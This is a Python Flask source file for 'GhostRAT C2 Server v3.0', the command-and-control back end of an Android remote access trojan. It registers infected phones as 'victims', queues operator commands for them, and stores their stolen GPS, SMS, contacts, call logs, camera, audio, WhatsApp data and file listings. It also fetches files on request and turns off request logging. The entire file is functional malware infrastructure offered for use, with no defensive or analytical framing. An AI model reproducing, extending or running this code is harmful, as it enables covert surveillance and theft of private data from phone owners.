#!/usr/bin/env python3
"""
GhostRAT C2 Server - Complete Version
- Data Storage
- File Path Storage
- File Download System
- Activity Logs
- Auto Save
"""
import os
import json
import hashlib
import secrets
import time
import threading
from flask import Flask, request, jsonify
from datetime import datetime
import logging

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True

# ============ STORAGE ============
victims = {}
commands = {}
data_store = {}
file_paths = {}
file_requests = {}
activity_logs = []

ADMIN_TOKEN = os.environ.get('ADMIN_TOKEN', secrets.token_hex(32))

# ============ DATA PERSISTENCE ============
DATA_DIR = "/tmp/ghostrat_data"

def save_data():
    try:
        if not os.path.exists(DATA_DIR):
            os.makedirs(DATA_DIR)
        with open(DATA_DIR + "/victims.json", "w") as f:
            json.dump(victims, f, default=str)
        with open(DATA_DIR + "/data_store.json", "w") as f:
            json.dump(data_store, f, default=str)
        with open(DATA_DIR + "/file_paths.json", "w") as f:
            json.dump(file_paths, f, default=str)
        with open(DATA_DIR + "/activity_logs.json", "w") as f:
            json.dump(activity_logs[-200:], f, default=str)
    except Exception as e:
        print("Save error:", e)

def load_data():
    global victims, data_store, file_paths, activity_logs
    try:
        if os.path.exists(DATA_DIR + "/victims.json"):
            with open(DATA_DIR + "/victims.json", "r") as f:
                victims = json.load(f)
        if os.path.exists(DATA_DIR + "/data_store.json"):
            with open(DATA_DIR + "/data_store.json", "r") as f:
                data_store = json.load(f)
        if os.path.exists(DATA_DIR + "/file_paths.json"):
            with open(DATA_DIR + "/file_paths.json", "r") as f:
                file_paths = json.load(f)
        if os.path.exists(DATA_DIR + "/activity_logs.json"):
            with open(DATA_DIR + "/activity_logs.json", "r") as f:
                activity_logs = json.load(f)
        print(f"[*] Loaded {len(victims)} victims from disk")
    except Exception as e:
        print("Load error:", e)

def auto_save():
    save_data()
    threading.Timer(300, auto_save).start()

# ============ LOGGING ============
def add_log(log_type, message, victim_id=None, details=None):
    log_entry = {
        'id': len(activity_logs) + 1,
        'timestamp': datetime.now().isoformat(),
        'type': log_type,
        'victim_id': victim_id,
        'message': message,
        'details': str(details) if details else ''
    }
    activity_logs.append(log_entry)
    if len(activity_logs) > 500:
        activity_logs.pop(0)

# ============ AUTH ============
def verify_admin(req):
    token = req.headers.get("X-Admin-Token", "")
    return token == ADMIN_TOKEN

# ============ ROUTES ============

@app.route('/')
def home():
    return jsonify({'status': 'GhostRAT C2 Active', 'victims': len(victims)})

# ==================== VICTIM REGISTER ====================

@app.route('/victim/register', methods=['POST'])
def victim_register():
    try:
        data = request.get_json()
        device_id = data.get('device_id', '')
        model = data.get('model', 'Unknown')
        
        for vid, info in victims.items():
            if info.get('device_id') == device_id:
                victims[vid]['last_seen'] = datetime.now().isoformat()
                victims[vid]['online'] = True
                add_log('register', f'Device re-connected: {model}', vid)
                return jsonify({'status': 'already_registered', 'victim_id': vid, 'check_interval': 30})
        
        victim_id = hashlib.sha256((device_id + str(time.time())).encode()).hexdigest()[:16]
        
        victims[victim_id] = {
            'device_id': device_id,
            'model': model,
            'manufacturer': data.get('manufacturer', 'Unknown'),
            'android': data.get('android', 'Unknown'),
            'sdk': data.get('sdk', 'Unknown'),
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'online': True
        }
        
        commands[victim_id] = []
        data_store[victim_id] = {
            'gps': [], 'sms': [], 'contacts': [], 'call_logs': [],
            'files': [], 'camera': [], 'audio': [], 'whatsapp': []
        }
        
        add_log('register', f'New device: {model}', victim_id)
        return jsonify({'status': 'registered', 'victim_id': victim_id, 'check_interval': 30})
    except Exception as e:
        add_log('error', f'Register failed: {str(e)}')
        return jsonify({'status': 'error'}), 400

# ==================== VICTIM CHECKIN ====================

@app.route('/victim/checkin', methods=['POST'])
def victim_checkin():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        
        if victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404
        
        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        victims[victim_id]['online'] = True
        
        pending = commands.get(victim_id, [])
        commands[victim_id] = []
        
        if pending:
            add_log('response', f'Sent {len(pending)} commands', victim_id, str(pending))
        
        return jsonify({'status': 'ok', 'commands': pending})
    except Exception as e:
        add_log('error', f'Checkin failed: {str(e)}', victim_id)
        return jsonify({'status': 'error'}), 400

# ==================== VICTIM UPLOAD ====================

@app.route('/victim/upload', methods=['POST'])
def victim_upload():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        payload = data.get('data', '')
        data_type = data.get('type', 'unknown')
        
        if victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404
        
        if victim_id not in data_store:
            data_store[victim_id] = {}
        if data_type not in data_store[victim_id]:
            data_store[victim_id][data_type] = []
        
        entry = {
            'data': payload,
            'timestamp': datetime.now().isoformat(),
            'size': len(payload)
        }
        
        data_store[victim_id][data_type].append(entry)
        if len(data_store[victim_id][data_type]) > 50:
            data_store[victim_id][data_type] = data_store[victim_id][data_type][-50:]
        
        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        victims[victim_id]['online'] = True
        
        add_log('upload', f'Data: {data_type} ({len(payload)} chars)', victim_id)
        return jsonify({'status': 'stored', 'type': data_type, 'count': len(data_store[victim_id][data_type])})
    except Exception as e:
        add_log('error', f'Upload failed: {str(e)}', victim_id)
        return jsonify({'status': 'error'}), 400

# ==================== FILE PATHS UPLOAD ====================

@app.route('/victim/upload_paths', methods=['POST'])
def victim_upload_paths():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        paths_json = data.get('data', '')
        
        if victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404
        
        try:
            paths = json.loads(paths_json)
            file_paths[victim_id] = paths
        except:
            file_paths[victim_id] = []
        
        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        count = len(file_paths.get(victim_id, []))
        add_log('upload', f'File paths: {count} files', victim_id)
        
        return jsonify({'status': 'stored', 'file_count': count})
    except Exception as e:
        add_log('error', f'Path upload failed: {str(e)}', victim_id)
        return jsonify({'status': 'error'}), 400

# ==================== FILE CONTENT UPLOAD ====================

@app.route('/victim/upload_file', methods=['POST'])
def victim_upload_file():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        request_id = data.get('request_id', '')
        file_data = data.get('data', '')
        file_name = data.get('file_name', 'unknown')
        
        if victim_id not in file_requests:
            file_requests[victim_id] = []
        
        for req in file_requests.get(victim_id, []):
            if req['request_id'] == request_id:
                req['status'] = 'completed'
                req['file_data'] = file_data
                req['completed_time'] = datetime.now().isoformat()
                break
        
        add_log('response', f'File received: {file_name} ({len(file_data)} chars)', victim_id)
        return jsonify({'status': 'received', 'request_id': request_id})
    except Exception as e:
        add_log('error', f'File upload failed: {str(e)}', victim_id)
        return jsonify({'status': 'error'}), 400

# ==================== ADMIN: GET VICTIMS ====================

@app.route('/admin/victims', methods=['GET'])
def admin_get_victims():
    if not verify_admin(request):
        add_log('error', 'Unauthorized admin access')
        return jsonify({'error': 'Unauthorized'}), 403
    
    result = []
    for vid, info in victims.items():
        data_types = {}
        if vid in data_store:
            for dtype, entries in data_store[vid].items():
                data_types[dtype] = len(entries)
        
        result.append({
            'victim_id': vid,
            'model': info['model'],
            'manufacturer': info['manufacturer'],
            'android': info['android'],
            'online': info['online'],
            'last_seen': info['last_seen'],
            'data_available': data_types
        })
    
    return jsonify({'victims': result})

# ==================== ADMIN: SEND COMMAND ====================

@app.route('/admin/send_command', methods=['POST'])
def admin_send_command():
    if not verify_admin(request):
        add_log('error', 'Unauthorized command attempt')
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    command = data.get('command', '')
    cmd_type = data.get('type', 'raw')
    request_id = data.get('request_id', '')
    
    if victim_id not in victims:
        return jsonify({'error': 'Victim not found'}), 404
    
    cmd_entry = {
        'type': cmd_type,
        'command': command,
        'time': datetime.now().isoformat()
    }
    
    if request_id:
        cmd_entry['request_id'] = request_id
    
    commands[victim_id].append(cmd_entry)
    
    add_log('command', f'Command: {cmd_type}', victim_id, command[:100])
    return jsonify({'status': 'queued', 'pending_commands': len(commands[victim_id])})

# ==================== ADMIN: GET DATA ====================

@app.route('/admin/get_data', methods=['POST'])
def admin_get_data():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    data_type = data.get('data_type', 'all')
    
    if victim_id not in data_store:
        return jsonify({'error': 'No data for this victim'}), 404
    
    if data_type == 'all':
        result = {}
        for dtype, entries in data_store[victim_id].items():
            result[dtype] = {
                'count': len(entries),
                'latest': entries[-5:] if entries else []
            }
        return jsonify({'victim_id': victim_id, 'data': result})
    
    if data_type not in data_store[victim_id]:
        return jsonify({'error': 'No ' + data_type + ' data'}), 404
    
    entries = data_store[victim_id][data_type]
    return jsonify({
        'victim_id': victim_id,
        'data_type': data_type,
        'count': len(entries),
        'entries': entries[-20:]
    })

# ==================== ADMIN: GET FILE LIST ====================

@app.route('/admin/get_file_list', methods=['POST'])
def admin_get_file_list():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    
    if victim_id not in file_paths:
        return jsonify({'error': 'No files indexed', 'files': []}), 200
    
    paths = file_paths.get(victim_id, [])
    return jsonify({
        'victim_id': victim_id,
        'file_count': len(paths),
        'files': paths
    })

# ==================== ADMIN: REQUEST FILE ====================

@app.route('/admin/request_file', methods=['POST'])
def admin_request_file():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    file_path = data.get('file_path', '')
    file_name = data.get('file_name', 'unknown')
    
    if victim_id not in victims:
        return jsonify({'error': 'Victim not found'}), 404
    
    request_id = secrets.token_hex(8)
    
    if victim_id not in file_requests:
        file_requests[victim_id] = []
    
    file_requests[victim_id].append({
        'request_id': request_id,
        'file_path': file_path,
        'file_name': file_name,
        'status': 'pending',
        'time': datetime.now().isoformat()
    })
    
    commands[victim_id].append({
        'type': 'download',
        'command': file_path,
        'request_id': request_id
    })
    
    add_log('command', f'File request: {file_name}', victim_id, file_path)
    return jsonify({
        'status': 'queued',
        'request_id': request_id,
        'message': 'File download requested'
    })

# ==================== ADMIN: GET FILE DATA ====================

@app.route('/admin/get_file_data', methods=['POST'])
def admin_get_file_data():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    request_id = data.get('request_id', '')
    
    if victim_id not in file_requests:
        return jsonify({'error': 'No requests'}), 404
    
    for req in file_requests.get(victim_id, []):
        if req['request_id'] == request_id:
            if req['status'] == 'completed':
                return jsonify({
                    'status': 'completed',
                    'file_name': req['file_name'],
                    'file_data': req.get('file_data', ''),
                    'size': len(req.get('file_data', ''))
                })
            else:
                return jsonify({'status': req['status']})
    
    return jsonify({'error': 'Request not found'}), 404

# ==================== ADMIN: LOGS ====================

@app.route('/admin/logs', methods=['GET'])
def admin_get_logs():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    
    recent_logs = activity_logs[-100:] if len(activity_logs) > 100 else activity_logs
    
    return jsonify({
        'total_logs': len(activity_logs),
        'logs': recent_logs
    })

# ==================== PING ====================

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({
        'status': 'alive',
        'victims': len(victims),
        'logs': len(activity_logs),
        'uptime': 'running'
    })

# ==================== MAIN ====================

if __name__ == '__main__':
    load_data()
    auto_save()
    port = int(os.environ.get('PORT', 8080))
    print("=" * 50)
    print("  👻 GhostRAT C2 Server v3.0")
    print("=" * 50)
    print(f"  Admin Token: {ADMIN_TOKEN}")
    print(f"  Victims loaded: {len(victims)}")
    print(f"  Server port: {port}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=port)
